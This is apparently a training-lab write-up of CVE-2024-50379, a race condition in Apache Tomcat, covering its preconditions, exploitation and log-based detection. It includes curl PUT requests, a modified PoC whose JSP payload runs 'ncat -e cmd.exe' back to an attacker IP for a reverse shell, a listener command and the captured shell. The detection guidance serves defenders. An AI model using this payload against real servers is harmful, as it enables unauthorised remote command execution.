https://nvd.nist.gov/vuln/detail/CVE-2024-50379
Apache Tomcat is an open-source web server and serverlet container. 
A **serverlet** is a Java class created to run an application server and handle client requests.

This CVE impact the following versions of Apache Tomcat:
- Apache Tomcat 11.0.0-M1 to 11.0.1 (Fixed in 11.0.2 or later)
- Apache Tomcat 10.1.0-M1 to 10.1.33 (Fixed in 10.1.34 or later)
- Apache Tomcat 9.0.0.M1 to 9.0.97 (Fixed in 9.0.98 or later)

This vulnerability is an exemple of Time-of-check Time-of-use (TOCTOU) vuln.
# Technical background
## Conditions
There is 2 conditions to exploit this vulnerability.
### 1. Allow upload and delete files
The server is configured to accept HTTP commands such as PUT and DELETE.

Writing is enabled by setting `readonly` to `false` in the `web.xml` configuration file. Note that the default configuration is readonly.
```xml
<init-param>
  <param-name>readonly</param-name>
  <param-value>false</param-value>
</init-param>
```

Here is an exemple of insecure configuration:
```xml
<servlet>
  <servlet-name>default</servlet-name>
  <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
  <init-param>
    <param-name>debug</param-name>
    <param-value>0</param-value>
  </init-param>
  <init-param>
    <param-name>listings</param-name>
    <param-value>false</param-value>
  </init-param>
  <init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
  </init-param>
  <load-on-startup>1</load-on-startup>
</servlet>
```
### 2. Run Tomcat in case-insensitive system
The second condition for exploiting this vulnerability is for Tomcat to run on a case-insensitive system, such as MS Windows or macOS.

On case-sensitive systems like Linux, `demo.jsp` and `demo.Jsp` are two different files.

But MS Windows would treat `demo.Jsp` no different than it would treat a servlet properly named `demo.jsp`.

## Checking
If we try to create the file `demo.jsp` it will return an error because the `jsp` files are executable. 
```bash
curl -X PUT -d "test" http://10.10.38.182:8080/demo.jsp
<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> JSP file [&#47;demo.jsp] not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/10.1.25</h3></body></html>
```

But if we create a file with the `.Jsp` extension Tomcat doesn't consider it as an executable.
```bash
> curl -X PUT -d "test" http://10.10.38.182:8080/demo.Jsp

> curl  http://10.10.38.182:8080/demo.Jsp
test
```
# Exploitation
There is a PoC of this: `git clone https://github.com/iSee857/CVE-2024-50379-PoC`
We will make two changes to this script:
- **Modify the loop counter**: Change the number of loop 10000 -> 2000
- **Change the payload**: Change the payload from run the calc to create a reverse shell
## Changing the payload
```python
# payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
payload_put = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c start ncat -e cmd.exe 10.10.66.46 8888\"); %>"
```
## Exploit
### Start listener
```bash
$ nc -vnlp 8888
```
### Run the script
```bash
$ python3 /root/Rooms/Tomcat-CVE-2024-50379/poc.py -u 10.10.38.182:8888
Checking http://10.10.38.182:8888/..
```
### Get the shell
```bash
netcat -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.38.182 49767
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 10.1>
```
# Detection
To detect it just go in the logs directory:
`C:\Program Files\Apache Software Foundation\<Tomcat Version>\logs\*access_log*`
And check for:
1. **PUT** requests to upload the file with uppercase (**.Jsp** or **.JSP**) extension (`"PUT /cve.Jsp"`)
2. **GET** request to the same file immediately after, but now to the **.jsp** extension (`"GET /cve.jsp"`)
3. **GET** request is logged with either **200** or **404** status code, depending if race condition succeeded or not
4. The steps above are repeated until the race condition is successful; usually, it’s 1000 or more attempts

```http
10.14.97.15 - - [30/Jan/2025:14:25:34 +0000] "PUT /cve.Jsp HTTP/1.1" 201 -
10.14.97.15 - - [30/Jan/2025:14:25:34 +0000] "GET /cve.jsp HTTP/1.1" 404 749
...
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "PUT /cve.Jsp HTTP/1.1" 409 654
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "GET /cve.jsp HTTP/1.1" 404 749
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "PUT /cve.Jsp HTTP/1.1" 204 -
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "GET /cve.jsp HTTP/1.1" 404 749
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "PUT /cve.Jsp HTTP/1.1" 204 -
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "GET /cve.jsp HTTP/1.1" 200 32
```
